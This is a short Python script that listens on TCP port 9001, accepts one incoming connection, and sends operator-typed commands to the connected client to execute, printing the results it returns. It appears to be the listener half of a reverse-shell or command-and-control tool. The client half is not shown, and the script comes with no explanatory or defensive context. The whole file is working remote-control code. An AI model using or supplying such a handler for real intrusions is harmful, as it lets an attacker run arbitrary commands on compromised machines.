import socket

# Define the server's IP address and port
SERVER_HOST = '0.0.0.0'  # Listen on all network interfaces
SERVER_PORT = 9001

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(1)
print(f"[*] Listening on all interfaces on port {SERVER_PORT}")

# Accept a client connection
client_socket, client_address = server_socket.accept()
print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

# Function to receive data from the client
def receive_data():
    data = client_socket.recv(4096).decode()
    print("[Client Output]:", data)

# Send commands to the client
while True:
    # Get command from user input
    command = input("Enter command to execute on the client (or 'exit' to quit): ")
    if command.lower() == 'exit':
        client_socket.send(b'exit')  # Signal client to exit
        break
    
    # Send the command to the client
    client_socket.send(command.encode())

    # Receive the output from the client
    receive_data()

# Close the connection
client_socket.close()
server_socket.close()
